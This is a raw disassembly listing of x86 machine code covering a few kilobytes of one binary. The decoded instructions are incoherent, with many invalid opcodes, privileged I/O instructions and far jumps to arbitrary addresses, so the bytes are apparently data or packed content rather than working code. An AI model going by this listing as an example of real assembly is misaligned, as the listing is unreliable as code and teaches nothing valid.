  41c5a6:	and    ah,BYTE PTR [edi+edx*2+0x5ed1da1]
  41c5ad:	jno    0x41c5ee
  41c5af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c5b0:	push   eax
  41c5b1:	jno    0x41c540
  41c5b3:	inc    ecx
  41c5b4:	cmc    
  41c5b5:	dec    ebp
  41c5b6:	fist   WORD PTR [ebp-0x6b397f1d]
  41c5bc:	push   ds
  41c5bd:	jb     0x41c57c
  41c5bf:	pop    esp
  41c5c0:	dec    ecx
  41c5c1:	shr    BYTE PTR [edx+0x54],0xc8
  41c5c5:	or     edx,edi
  41c5c7:	mov    ds:0xa08a3c33,eax
  41c5cc:	mov    edi,0xcfd65f1d
  41c5d1:	jp     0x41c646
  41c5d3:	arpl   ax,cx
  41c5d5:	xchg   esp,eax
  41c5d6:	jnp    0x41c60f
  41c5d8:	scas   al,BYTE PTR es:[edi]
  41c5d9:	push   cs
  41c5da:	imul   eax,DWORD PTR [edx+0x49],0xffffffed
  41c5de:	fisub  DWORD PTR [edi+ecx*1+0x20]
  41c5e2:	push   ebx
  41c5e3:	idiv   DWORD PTR [edi]
  41c5e5:	sti    
  41c5e6:	xchg   edi,eax
  41c5e7:	xor    BYTE PTR ds:0xe6bea203,ah
  41c5ed:	into   
  41c5ee:	mov    es,ebp
  41c5f0:	xor    eax,0x6d2fcef4
  41c5f5:	push   edx
  41c5f6:	mov    eax,0xc36b71e2
  41c5fb:	adc    DWORD PTR [eax-0x1e],0x9
  41c5ff:	daa    
  41c600:	scas   al,BYTE PTR es:[edi]
  41c601:	lods   eax,DWORD PTR ds:[esi]
  41c602:	cmc    
  41c603:	adc    eax,0x5d6896b0
  41c608:	push   esp
  41c609:	or     dh,BYTE PTR [ecx+0x4ff9f08e]
  41c60f:	xor    al,0xeb
  41c611:	or     ch,BYTE PTR [esi+ecx*2-0x27]
  41c615:	fwait
  41c616:	in     al,dx
  41c617:	fcmovu st,st(0)
  41c619:	lds    ebx,FWORD PTR ds:0x4436bea1
  41c61f:	xchg   ecx,eax
  41c620:	test   eax,0xc0114a6b
  41c625:	loope  0x41c638
  41c627:	jmp    0x497dfa55
  41c62c:	arpl   WORD PTR [edi],cx
  41c62e:	mov    ah,0xaa
  41c630:	es inc di
  41c633:	mov    esi,0xd02b427d
  41c638:	pop    esi
  41c639:	xor    ah,BYTE PTR [ebp+0x64]
  41c63c:	cmp    ch,ch
  41c63e:	jo     0x41c641
  41c640:	push   es
  41c641:	mov    bh,0xd8
  41c643:	pop    ebp
  41c644:	or     al,BYTE PTR [ebp+0x79]
  41c647:	jae    0x41c60e
  41c649:	sti    
  41c64a:	rcl    BYTE PTR [ebx],cl
  41c64c:	and    eax,0xf28f921d
  41c651:	push   ebp
  41c652:	shl    ecx,cl
  41c654:	adc    cl,bh
  41c656:	pop    ss
  41c657:	call   0xdb69:0x71118d17
  41c65e:	push   ebp
  41c65f:	inc    esp
  41c660:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c661:	xor    bl,0xc6
  41c664:	jmp    0x41c614
  41c666:	cwde   
  41c667:	cdq    
  41c668:	shr    ebx,cl
  41c66a:	sbb    edi,DWORD PTR [eax+0xb]
  41c66d:	mov    es,WORD PTR [edi+0x4]
  41c670:	xchg   ebx,eax
  41c671:	push   ebx
  41c672:	or     bh,dl
  41c674:	cmc    
  41c675:	cld    
  41c676:	xor    BYTE PTR [eax+0x43bc252d],dl
  41c67c:	inc    edx
  41c67d:	sbb    BYTE PTR [eax-0x26],dh
  41c680:	or     eax,0x8907ef83
  41c685:	test   DWORD PTR [ecx],esi
  41c687:	push   cs
  41c688:	out    dx,eax
  41c689:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c68a:	xor    esi,DWORD PTR [eax]
  41c68c:	int    0xb9
  41c68e:	push   esp
  41c68f:	je     0x41c669
  41c691:	cmp    esi,DWORD PTR [edi+esi*4]
  41c694:	cmp    bh,BYTE PTR [eax+0xe917a83]
  41c69a:	pop    eax
  41c69b:	push   0x1b
  41c69d:	into   
  41c69e:	mov    al,ds:0x9eb027e4
  41c6a3:	jo     0x41c704
  41c6a5:	xor    DWORD PTR [edi+0x41257a0a],esi
  41c6ab:	pop    ds
  41c6ac:	bound  eax,QWORD PTR [edx]
  41c6ae:	adc    al,0x5e
  41c6b0:	and    bl,BYTE PTR [ecx-0x28]
  41c6b3:	mov    ch,0x84
  41c6b5:	jbe    0x41c6c0
  41c6b7:	dec    ebx
  41c6b8:	jnp    0x41c6df
  41c6ba:	inc    ecx
  41c6bb:	mov    al,ds:0x2369dee9
  41c6c0:	test   BYTE PTR [esi-0x57],0xd
  41c6c4:	test   eax,0x51655f82
  41c6c9:	pop    esi
  41c6ca:	rol    BYTE PTR [eax+esi*2],0x80
  41c6ce:	sub    BYTE PTR [ebp+0x2a00ad3],al
  41c6d4:	sub    eax,0x13f80a2c
  41c6d9:	rcl    DWORD PTR [ebx-0x6a],cl
  41c6dc:	mov    ah,0xc0
  41c6de:	and    eax,DWORD PTR [eax+0x2b5e8f07]
  41c6e4:	xor    dh,BYTE PTR [eax-0x44]
  41c6e7:	aas    
  41c6e8:	sbb    eax,0xfecb948a
  41c6ed:	mov    ds:0xa318a3be,eax
  41c6f2:	shl    DWORD PTR [eax-0x2880f40c],cl
  41c6f8:	xor    esi,DWORD PTR [esi-0x156a5862]
  41c6fe:	push   ebx
  41c6ff:	mov    al,0x24
  41c701:	fstp   QWORD PTR [esi+0x3083e717]
  41c707:	div    DWORD PTR [edx-0x71]
  41c70a:	push   cs
  41c70b:	std    
  41c70c:	pop    ecx
  41c70d:	call   0xab3ea11d
  41c712:	fdivr  st(7),st
  41c714:	mov    ecx,0x1e882c54
  41c719:	scas   eax,DWORD PTR es:[edi]
  41c71a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c71b:	or     eax,DWORD PTR [edx+0x2eff27e3]
  41c721:	(bad)  
  41c722:	cdq    
  41c723:	jb     0x41c6ce
  41c725:	outs   dx,BYTE PTR ds:[esi]
  41c726:	icebp  
  41c727:	(bad)  
  41c728:	mov    edx,0xbbc53016
  41c72d:	imul   BYTE PTR [esi]
  41c72f:	push   cs
  41c730:	inc    edx
  41c731:	mov    eax,0x8c5e1680
  41c736:	push   0xffffffa8
  41c738:	inc    esp
  41c739:	or     ebp,DWORD PTR [ebx-0x47]
  41c73c:	inc    edi
  41c73d:	fucomi st,st(0)
  41c73f:	jnp    0x41c6ea
  41c741:	inc    edx
  41c742:	gs test esi,ecx
  41c745:	mov    ebx,0xbdd5b8a6
  41c74a:	pop    ss
  41c74b:	mov    ebx,0xde9e81b5
  41c750:	retf   0xa592
  41c753:	nop
  41c754:	in     al,0x81
  41c756:	icebp  
  41c757:	and    al,0x46
  41c759:	add    al,0x7c
  41c75b:	lea    ecx,[ebx-0x34]
  41c75e:	dec    eax
  41c75f:	and    DWORD PTR [ebp-0xe],esp
  41c762:	mov    dh,BYTE PTR [edi]
  41c764:	hlt    
  41c765:	sahf   
  41c766:	sahf   
  41c767:	loope  0x41c74f
  41c769:	dec    esp
  41c76a:	lods   al,BYTE PTR ds:[esi]
  41c76b:	or     ebp,0xaa03d024
  41c771:	xlat   BYTE PTR ds:[ebx]
  41c772:	rcr    BYTE PTR [esi+ebp*1],cl
  41c775:	mov    esp,0x5d072f9e
  41c77a:	rol    dh,1
  41c77c:	mov    dh,0xed
  41c77e:	add    edi,DWORD PTR [ebx-0x20110227]
  41c784:	mov    bl,0x86
  41c786:	js     0x41c729
  41c788:	icebp  
  41c789:	stos   BYTE PTR es:[edi],al
  41c78a:	jecxz  0x41c7cd
  41c78c:	pop    ecx
  41c78d:	inc    edx
  41c78e:	fs pop ss
  41c790:	rcr    BYTE PTR [edx],1
  41c792:	dec    esi
  41c793:	cdq    
  41c794:	mov    dh,0x6d
  41c796:	push   edi
  41c797:	xchg   ecx,eax
  41c798:	sbb    DWORD PTR [esi+0x4f89097],esi
  41c79e:	loopne 0x41c782
  41c7a0:	add    eax,0x94536c94
  41c7a5:	push   edx
  41c7a6:	(bad)  
  41c7a7:	int3   
  41c7a8:	mov    al,0xcc
  41c7aa:	xor    BYTE PTR ds:0xa366a161,cl
  41c7b0:	xchg   ebp,eax
  41c7b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c7b2:	daa    
  41c7b3:	test   esi,0xce4c53fe
  41c7b9:	dec    edx
  41c7ba:	sub    al,0x85
  41c7bc:	mov    edi,0xe2ec2b88
  41c7c1:	sbb    al,0x7c
  41c7c3:	jecxz  0x41c786
  41c7c5:	es dec ecx
  41c7c7:	mov    esi,0xa21d3073
  41c7cc:	adc    dl,BYTE PTR [ecx]
  41c7ce:	mov    al,ds:0x7a73e259
  41c7d3:	out    0x4b,eax
  41c7d5:	std    
  41c7d6:	stos   BYTE PTR es:[edi],al
  41c7d7:	pop    edx
  41c7d8:	dec    ebp
  41c7d9:	mov    esp,0xeb9a36dc
  41c7de:	mov    esp,0x23bc497a
  41c7e3:	data16 jl 0x41c7d2
  41c7e6:	push   cs
  41c7e7:	pop    es
  41c7e8:	sub    esi,DWORD PTR [edx]
  41c7ea:	ror    bh,cl
  41c7ec:	fadd   DWORD PTR [ebx+0xf]
  41c7ef:	push   ebx
  41c7f0:	sbb    bh,BYTE PTR [ecx+0x50]
  41c7f3:	cmp    eax,0x4fbf5029
  41c7f8:	mov    dl,0xd3
  41c7fa:	or     al,ch
  41c7fc:	xchg   BYTE PTR [edi],ah
  41c7fe:	xchg   BYTE PTR [esp+eiz*4-0x63901338],cl
  41c805:	out    dx,al
  41c806:	mov    BYTE PTR [esi],ch
  41c808:	mov    ch,0x21
  41c80a:	sbb    al,0xa8
  41c80c:	pop    es
  41c80d:	mov    al,ds:0x7e6d1bc6
  41c812:	sbb    edx,DWORD PTR [eax]
  41c814:	mov    WORD PTR [ebx-0x4eacf56e],es
  41c81a:	cmp    eax,0xd7c59838
  41c81f:	mov    bh,0xef
  41c821:	mov    ds:0x1ca57739,eax
  41c826:	push   esp
  41c827:	call   0x98cb:0xe69d9673
  41c82e:	or     DWORD PTR [ecx+0x2a],eax
  41c831:	(bad)
  41c834:	int    0xae
  41c836:	xor    BYTE PTR [ebx+0xc],0x8d
  41c83a:	js     0x41c825
  41c83c:	xsha256 (bad)
  41c83d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c83e:	adc    ebp,DWORD PTR [eax]
  41c840:	push   0xc7563fd3
  41c845:	pop    ss
  41c846:	xchg   ebp,eax
  41c847:	pop    ss
  41c848:	xchg   edx,eax
  41c849:	loopne 0x41c7d2
  41c84b:	pop    esp
  41c84c:	imul   edi,DWORD PTR [ecx],0xfffffffb
  41c84f:	popa   
  41c850:	mov    al,0x4e
  41c852:	pop    eax
  41c853:	jne    0x41c893
  41c855:	sar    dl,1
  41c857:	xchg   ecx,eax
  41c858:	ror    BYTE PTR [edx-0x7a9f1584],0x1d
  41c85f:	in     al,0x6
  41c861:	mov    ds:0x599ae462,al
  41c866:	push   0xffffffa7
  41c868:	and    BYTE PTR [esi-0x24],cl
  41c86b:	mov    ds:0x483e32f0,eax
  41c870:	jge    0x41c81c
  41c872:	cmp    ebp,DWORD PTR [esi-0x21]
  41c875:	xor    BYTE PTR [ebx],ch
  41c877:	jno    0x41c807
  41c879:	out    0xe0,eax
  41c87b:	xchg   edx,eax
  41c87c:	call   0x2726:0x53dfe72c
  41c883:	sbb    al,0xfe
  41c886:	jecxz  0x41c8ac
  41c888:	mov    fs,WORD PTR [ecx-0xbc41da1]
  41c88e:	js     0x41c8be
  41c890:	rcr    DWORD PTR [edx-0x9e0b35b],cl
  41c896:	sub    BYTE PTR cs:[ebp+0x1f9f7061],ch
  41c89d:	dec    edi
  41c89e:	sub    ebp,esi
  41c8a0:	push   ds
  41c8a1:	retf   0x8661
  41c8a4:	popa   
  41c8a5:	in     al,dx
  41c8a6:	pushf  
  41c8a7:	pop    esi
  41c8a8:	mov    eax,0xddfbd55a
  41c8ad:	mov    edx,0x2f81a4c0
  41c8b2:	mov    ch,BYTE PTR [esi]
  41c8b4:	push   esp
  41c8b5:	test   DWORD PTR [edx-0xc17ae37],esp
  41c8bb:	stc    
  41c8bc:	aam    0xb7
  41c8be:	fwait
  41c8bf:	ss push ebp
  41c8c1:	jmp    0xe75951a5
  41c8c6:	push   ebx
  41c8c7:	aas    
  41c8c8:	stos   BYTE PTR es:[edi],al
  41c8c9:	add    al,0x61
  41c8cb:	fadd   QWORD PTR [eax-0x487b2f03]
  41c8d1:	sub    ebx,DWORD PTR fs:[esi]
  41c8d4:	lock jge 0x41c907
  41c8d7:	cmp    ecx,DWORD PTR [ecx]
  41c8d9:	lahf   
  41c8da:	cmp    BYTE PTR [ebp+0x163f5029],ah
  41c8e0:	adc    al,0xd0
  41c8e2:	cmp    al,0xdb
  41c8e4:	pop    esi
  41c8e5:	ins    DWORD PTR es:[edi],dx
  41c8e6:	or     DWORD PTR [ebp-0x66],ebx
  41c8e9:	jle    0x41c887
  41c8eb:	aas    
  41c8ec:	jno    0x41c8d8
  41c8ee:	pop    ebp
  41c8ef:	btc    DWORD PTR [ecx],esi
  41c8f2:	mov    dh,0x49
  41c8f4:	or     esp,edi
  41c8f6:	push   0x3e
  41c8f8:	aas    
  41c8f9:	and    ah,dh
  41c8fb:	stc    
  41c8fc:	jmp    0x2aa73b36
  41c901:	loope  0x41c8d9
  41c903:	adc    eax,0xe69f5a4e
  41c908:	sbb    BYTE PTR [eax],bl
  41c90a:	mov    ecx,0xd5fe9430
  41c90f:	repnz inc edi
  41c911:	shr    BYTE PTR [edx],0x20
  41c914:	or     bh,bl
  41c916:	stc    
  41c917:	inc    ebp
  41c918:	xor    DWORD PTR [ebp-0x50],edx
  41c91b:	mov    al,gs:0xd38c1934
  41c921:	xchg   edx,eax
  41c922:	jno    0x41c979
  41c924:	stc    
  41c925:	push   edx
  41c926:	push   cs
  41c927:	mov    edi,0xd14fba73
  41c92c:	mov    dh,0xf3
  41c92e:	jg     0x41c97a
  41c930:	sub    al,0x5b
  41c933:	test   al,0xbf
  41c935:	or     BYTE PTR [esi+edi*8+0x2d],cl
  41c939:	sbb    esp,esp
  41c93b:	lods   eax,DWORD PTR ds:[si]
  41c93d:	iret   
  41c93e:	les    esi,FWORD PTR [eax+0x18858ed6]
  41c944:	stos   BYTE PTR es:[edi],al
  41c945:	aam    0x15
  41c947:	std    
  41c948:	sub    al,0xd5
  41c94a:	mov    al,0x41
  41c94c:	aam    0x8e
  41c94e:	mov    eax,0xd6b0d102
  41c953:	and    ah,al
  41c955:	out    dx,al
  41c956:	pop    ebp
  41c957:	sub    bl,BYTE PTR [esi-0x22bea5e9]
  41c95d:	mov    esp,0x682a7d2e
  41c962:	sbb    DWORD PTR ds:0x6549d8f6,esi
  41c968:	cli    
  41c969:	push   esp
  41c96a:	mov    al,ds:0xdf108c9f
  41c96f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c970:	(bad)  
  41c971:	jmpw   0x58a7
  41c975:	rcl    BYTE PTR [eax+ebp*8-0x3e],0x85
  41c97a:	cmp    al,0x32
  41c97c:	adc    eax,0x67a4b72e
  41c981:	scas   al,BYTE PTR es:[edi]
  41c982:	jge    0x41c9ff
  41c984:	lock daa 
  41c986:	jo     0x41c973
  41c988:	dec    esi
  41c989:	mov    es,WORD PTR [ecx+0x36ad2d66]
  41c98f:	push   esi
  41c990:	loop   0x41c98d
  41c992:	lahf   
  41c993:	pop    ecx
  41c994:	mov    bl,0x33
  41c996:	xchg   esp,ecx
  41c998:	sub    ch,bh
  41c99a:	sahf   
  41c99b:	test   eax,0x10e40deb
  41c9a0:	es call 0x784b:0xed1c78bd
  41c9a8:	test   DWORD PTR [ecx],esp
  41c9aa:	inc    esi
  41c9ab:	loope  0x41ca20
  41c9ad:	div    BYTE PTR [ecx]
  41c9af:	mov    DWORD PTR fs:[edx+edi*2-0x5b],edx
  41c9b4:	and    edx,DWORD PTR [edx+0x258f7d68]
  41c9ba:	inc    edx
  41c9bb:	(bad)  
  41c9bc:	push   edi
  41c9bd:	cdq    
  41c9be:	pop    ds
  41c9bf:	icebp  
  41c9c0:	pop    eax
  41c9c1:	inc    edx
  41c9c2:	xor    esi,esp
  41c9c4:	xchg   ebx,eax
  41c9c5:	mov    ebp,0x42a69a76
  41c9ca:	scas   eax,DWORD PTR es:[edi]
  41c9cb:	or     bh,BYTE PTR [ebp+0x4b]
  41c9ce:	shl    DWORD PTR [ecx],cl
  41c9d0:	nop
  41c9d1:	call   0x2cfb:0x91888cb5
  41c9d8:	and    DWORD PTR [eax],ebp
  41c9da:	int    0x35
  41c9dc:	xchg   ebp,eax
  41c9dd:	je     0x41c968
  41c9df:	jecxz  0x41c9b3
  41c9e1:	adc    ah,al
  41c9e3:	rol    DWORD PTR [edx],0x73
  41c9e6:	push   0xffffffb7
  41c9e8:	cdq    
  41c9e9:	sti    
  41c9ea:	xchg   DWORD PTR [ecx-0x4f],edi
  41c9ed:	push   esi
  41c9ee:	inc    ebp
  41c9ef:	shr    BYTE PTR [eax+0x6d],0x31
  41c9f3:	stos   BYTE PTR es:[edi],al
  41c9f4:	dec    esp
  41c9f5:	dec    ebx
  41c9f6:	mov    esi,0x4d15330e
  41c9fb:	fsubr  QWORD PTR [esi-0x62eb33f4]
  41ca01:	push   ecx
  41ca02:	inc    esp
  41ca03:	jb     0x41ca6c
  41ca05:	gs out dx,al
  41ca07:	or     eax,0x78273a70
  41ca0c:	adc    DWORD PTR ds:0x70070612,esp
  41ca12:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ca13:	adc    al,0x3c
  41ca15:	sbb    eax,0xb8927775
  41ca1a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ca1b:	cs ins BYTE PTR es:[edi],dx
  41ca1d:	call   0xf79a0d83
  41ca22:	arpl   WORD PTR [ebx-0x4c14bc22],dx
  41ca28:	or     al,dl
  41ca2a:	inc    eax
  41ca2b:	add    ebx,DWORD PTR [edx]
  41ca2d:	push   ebx
  41ca2e:	(bad)  
  41ca2f:	dec    ebp
  41ca30:	mov    ds:0xbe8e19ca,al
  41ca35:	or     edi,DWORD PTR [eax-0x196374ed]
  41ca3b:	xchg   BYTE PTR [esi-0x39],ah
  41ca3e:	cli    
  41ca3f:	ret    0x2032
  41ca42:	ret    
  41ca43:	xchg   esi,eax
  41ca44:	and    eax,0xeeeca69c
  41ca49:	sbb    dh,bl
  41ca4b:	add    al,0x15
  41ca4d:	aad    0xc
  41ca4f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ca50:	aad    0xc6
  41ca52:	pop    esp
  41ca53:	jnp    0x41caa9
  41ca55:	cmp    BYTE PTR [edi],0x33
  41ca58:	(bad)  
  41ca59:	sbb    DWORD PTR [edi+0x4b],ebp
  41ca5c:	and    cl,BYTE PTR [ecx+0x5d1b774d]
  41ca62:	fidivr WORD PTR [eax+0x2e93792f]
  41ca68:	sbb    edx,DWORD PTR [edi-0x6f60f18f]
  41ca6e:	jae    0x41cab1
  41ca70:	mov    ds:0x172c2da4,al
  41ca75:	mul    BYTE PTR [eax]
  41ca77:	fidiv  DWORD PTR [ecx-0x1be8c504]
  41ca7d:	sar    DWORD PTR [ecx+0x30100b83],0xd0
  41ca84:	outs   dx,DWORD PTR ds:[esi]
  41ca85:	ret    0x196
  41ca88:	test   al,0xd6
  41ca8a:	and    al,0x27
  41ca8c:	fwait
  41ca8d:	in     eax,dx
  41ca8e:	aaa    
  41ca8f:	mov    ds:0xc6bea869,eax
  41ca94:	iret   
  41ca95:	add    bl,BYTE PTR [ebp-0x5]
  41ca98:	rol    BYTE PTR [ebx+ebp*2-0x49],cl
  41ca9c:	imul   BYTE PTR [eax-0x1f6149b1]
  41caa2:	ins    DWORD PTR es:[edi],dx
  41caa3:	out    dx,eax
  41caa4:	clc    
  41caa5:	lahf   
  41caa6:	xchg   ecx,eax
  41caa7:	(bad)  
  41caa8:	outs   dx,BYTE PTR ds:[esi]
  41caa9:	enter  0x66b5,0xac
  41caad:	xchg   BYTE PTR [ebp+ecx*2+0x64],al
  41cab1:	sti    
  41cab2:	icebp  
  41cab3:	shr    DWORD PTR [edx+0x3a],1
  41cab6:	ja     0x41caab
  41cab8:	mov    dl,0xf5
  41caba:	jl     0x41cadd
  41cabc:	mov    edi,0xbe637472
  41cac1:	sub    BYTE PTR [eax+0x5b],dl
  41cac4:	sbb    ebp,DWORD PTR [ebp+0x742f8492]
  41caca:	push   ebp
  41cacb:	jmp    0x29af:0x11445bd0
  41cad2:	ins    DWORD PTR es:[edi],dx
  41cad3:	popa   
  41cad4:	push   edx
  41cad5:	push   cs
  41cad6:	addr16 pop ebx
  41cad8:	es scas eax,DWORD PTR es:[edi]
  41cada:	out    0x35,eax
  41cadc:	mov    BYTE PTR [ebp-0x18],dh
  41cadf:	enter  0x25b7,0xa3
  41cae3:	std    
  41cae4:	xlat   BYTE PTR ds:[ebx]
  41cae5:	sbb    dl,BYTE PTR [edi]
  41cae7:	inc    edi
  41cae8:	std    
  41cae9:	dec    edx
  41caea:	in     eax,0xb2
  41caec:	pop    ecx
  41caed:	jae    0x41cb20
  41caef:	sub    al,ch
  41caf1:	or     DWORD PTR ds:0xdfefbdf,edi
  41caf7:	jbe    0x41cadb
  41caf9:	fadd   DWORD PTR [esi+esi*8+0x18]
  41cafd:	pop    es
  41cafe:	sub    BYTE PTR [ebp-0x417761e0],0x62
  41cb05:	and    DWORD PTR [eax],0xd86e9ecf
  41cb0b:	sub    DWORD PTR [ebx-0x173553f6],0xffffffde
  41cb12:	das    
  41cb13:	push   edx
  41cb14:	sub    ebx,DWORD PTR [edx+0x377b37dc]
  41cb1a:	or     ebp,DWORD PTR [eax]
  41cb1c:	add    BYTE PTR [edi-0x3174fe1e],bl
  41cb22:	pop    ecx
  41cb23:	and    BYTE PTR [eax+0x6d],dh
  41cb26:	loope  0x41cade
  41cb28:	shl    BYTE PTR [edx+0x15],1
  41cb2b:	and    eax,0xe8d74160
  41cb30:	jne    0x41cb61
  41cb32:	jg     0x41cac0
  41cb34:	fst    QWORD PTR [esi+0xe]
  41cb37:	dec    si
  41cb39:	adc    eax,0x41307cf7
  41cb3e:	outs   dx,BYTE PTR ds:[esi]
  41cb3f:	and    eax,0xdc725546
  41cb44:	mov    ah,0x31
  41cb46:	push   0xc046c81d
  41cb4b:	inc    edi
  41cb4c:	retf   
  41cb4d:	pop    ss
  41cb4e:	sbb    ebp,DWORD PTR [eax-0x1459915]
  41cb54:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cb55:	pop    esp
  41cb56:	and    al,0x65
  41cb58:	les    esi,FWORD PTR [ecx+0x28]
  41cb5b:	pop    ecx
  41cb5c:	or     ebx,DWORD PTR [ebx+0x20949d6c]
  41cb62:	dec    ebp
  41cb63:	out    0x13,eax
  41cb65:	push   0x5
  41cb67:	jl     0x41cb8c
  41cb69:	and    al,0xcb
  41cb6b:	push   es
  41cb6c:	or     dl,ch
  41cb6e:	inc    edi
  41cb6f:	mov    edx,0xa9f49642
  41cb74:	sahf   
  41cb75:	in     al,0x20
  41cb77:	dec    ebx
  41cb78:	pop    ebx
  41cb79:	rcr    BYTE PTR [edx-0x27],1
  41cb7c:	retf   0x2b90
  41cb7f:	lea    ebp,[ecx]
  41cb81:	inc    ebx
  41cb82:	jl     0x41cb10
  41cb84:	inc    ebx
  41cb85:	and    BYTE PTR [edi+0x668fdbad],dh
  41cb8b:	adc    eax,0x3565650b
  41cb90:	inc    ebp
  41cb91:	push   0xffffffcf
  41cb93:	mov    ch,0x5
  41cb95:	lds    eax,FWORD PTR [ecx]
  41cb97:	or     eax,0xe7e76c8a
  41cb9c:	lods   al,BYTE PTR ss:[esi]
  41cb9e:	adc    eax,0x96e6ca9e
  41cba3:	and    edx,0x800cdd8f
  41cba9:	jle    0x41cbd7
  41cbab:	enter  0x4550,0x9
  41cbaf:	push   ebp
  41cbb0:	rcl    DWORD PTR [edx-0x2afadad7],1
  41cbb6:	hlt    
  41cbb7:	shr    DWORD PTR [ebx],1
  41cbb9:	mov    cl,0xc5
  41cbbb:	pop    es
  41cbbc:	xchg   esi,ecx
  41cbbe:	imul   BYTE PTR [eax+0x3c]
  41cbc1:	out    0xb6,eax
  41cbc3:	pop    es
  41cbc4:	(bad)  
  41cbc5:	mov    eax,ds:0x77176577
  41cbca:	sbb    dh,BYTE PTR [ebx-0x17c71a8b]
  41cbd0:	adc    ebx,DWORD PTR [ebx-0x5c]
  41cbd3:	jle    0x41cb62
  41cbd5:	add    eax,0x1418da8f
  41cbda:	mov    al,0x51
  41cbdc:	pop    ebx
  41cbdd:	lods   al,BYTE PTR ds:[esi]
  41cbde:	adc    edi,ebx
  41cbe0:	cmp    ah,dl
  41cbe2:	or     BYTE PTR [eax-0x64],ah
  41cbe5:	repz cmp al,BYTE PTR [ecx-0x79]
  41cbe9:	ret    0xb4d7
  41cbec:	aaa    
  41cbed:	jle    0x41cb88
  41cbef:	mov    ss,ebx
  41cbf1:	aam    0x2c
  41cbf3:	rcl    ch,cl
  41cbf5:	les    edi,FWORD PTR [edi*1+0x4bf5f02]
  41cbfc:	xor    ebp,DWORD PTR [esi-0x56]
  41cbff:	push   0xa1d6f391
  41cc04:	mov    al,0x35
  41cc06:	xor    bl,bl
  41cc08:	shl    DWORD PTR [edi+0x28cfd1ed],0xb3
  41cc0f:	lock push es
  41cc11:	aas    
  41cc12:	ret    0x9998
  41cc15:	icebp  
  41cc16:	push   edi
  41cc17:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cc18:	add    esp,DWORD PTR [ecx]
  41cc1a:	lods   al,BYTE PTR ds:[esi]
  41cc1b:	(bad)  
  41cc1c:	ja     0x41cbc8
  41cc1e:	sub    cl,BYTE PTR es:[ecx-0x599d7448]
  41cc25:	scas   al,BYTE PTR es:[edi]
  41cc26:	mov    ds:0x8b2f0be,eax
  41cc2b:	or     DWORD PTR [eax+0x6b25099a],esp
  41cc31:	fcom   DWORD PTR [ecx]
  41cc33:	faddp  st(0),st
  41cc35:	aaa    
  41cc36:	outs   dx,DWORD PTR ds:[esi]
  41cc37:	rcr    DWORD PTR [ecx+0x2d],0x69
  41cc3b:	pop    edx
  41cc3c:	sti    
  41cc3d:	cmp    BYTE PTR [edi-0x52],bh
  41cc40:	popf   
  41cc41:	mov    ?,esp
  41cc43:	popf   
  41cc44:	into   
  41cc45:	(bad)  
  41cc47:	inc    esi
  41cc48:	(bad)  
  41cc49:	jg     0x41ccae
  41cc4b:	jmp    0x41cc51
  41cc4d:	in     eax,dx
  41cc4e:	lods   eax,DWORD PTR ds:[esi]
  41cc4f:	stos   BYTE PTR es:[edi],al
  41cc50:	je     0x41cc84
  41cc52:	adc    al,bl
  41cc54:	retf   0x281a
  41cc57:	cmc    
  41cc58:	inc    eax
  41cc59:	call   0x56b695a1
  41cc5e:	xchg   ebx,eax
  41cc5f:	out    dx,eax
  41cc60:	pop    es
  41cc61:	jmp    0xf8cc06e
  41cc66:	fwait
  41cc67:	xchg   edx,eax
  41cc68:	sbb    cl,ch
  41cc6a:	aam    0x21
  41cc6c:	jge    0x41cc83
  41cc6e:	fdiv   QWORD PTR [edx+0x64f42d76]
  41cc74:	js     0x41cc05
  41cc76:	push   eax
  41cc77:	jp     0x41cc0c
  41cc79:	call   0x8c1d9171
  41cc7e:	xchg   DWORD PTR [eax-0x10156d61],ecx
  41cc84:	popa   
  41cc85:	enter  0x9548,0x83
  41cc89:	std    
  41cc8a:	mov    esp,0x5f7571c7
  41cc8f:	std    
  41cc90:	(bad)  
  41cc91:	es lahf 
  41cc93:	sbb    eax,0x7f5fb0cc
  41cc98:	enter  0x3b61,0xe1
  41cc9c:	arpl   WORD PTR [esi],di
  41cc9e:	or     edi,DWORD PTR [edx+0x58]
  41cca1:	and    eax,0x3ec4553c
  41cca6:	jcxz   0x41cc39
  41cca9:	repnz hlt 
  41ccab:	mov    ds:0xe2cbdf29,al
  41ccb0:	shr    DWORD PTR [eax],cl
  41ccb2:	pop    ss
  41ccb3:	add    BYTE PTR [esi-0x51],bh
  41ccb6:	lods   al,BYTE PTR ds:[esi]
  41ccb7:	mov    WORD PTR [esi+0x7b],ss
  41ccba:	xor    al,BYTE PTR [ecx+0x3c]
  41ccbd:	sub    al,BYTE PTR [edx-0x3c]
  41ccc0:	or     BYTE PTR [eax],0xd8
  41ccc3:	and    al,0x21
  41ccc5:	mov    ch,0x23
  41ccc7:	xor    al,0x93
  41ccc9:	mov    ebp,eax
  41cccb:	shr    ebx,cl
  41cccd:	or     BYTE PTR [ecx],dh
  41cccf:	push   edi
  41ccd0:	xchg   edx,eax
  41ccd1:	mov    ah,0x89
  41ccd3:	pop    ss
  41ccd4:	mov    edi,0x5a93e80f
  41ccd9:	shr    BYTE PTR [ebp-0x7147e305],1
  41ccdf:	pop    esi
  41cce0:	lods   eax,DWORD PTR ds:[esi]
  41cce1:	cmc    
  41cce2:	fdivr  DWORD PTR [ebx+esi*8]
  41cce5:	test   al,0x6c
  41cce7:	rol    al,1
  41cce9:	pop    ds
  41ccea:	or     eax,0x97e4219d
  41ccef:	pop    es
  41ccf0:	shr    BYTE PTR ds:[edi-0x7f],0x15
  41ccf5:	mov    ebp,0x1aaef4db
  41ccfa:	ja     0x41cd38
  41ccfc:	jae    0x41ccd4
  41ccfe:	mov    ebp,0xe90a8f70
  41cd03:	sub    al,0x6e
  41cd05:	aam    0x4b
  41cd07:	add    eax,0x24467270
  41cd0c:	js     0x41cd74
  41cd0e:	clc    
  41cd0f:	call   0xd43780f5
  41cd14:	(bad)  
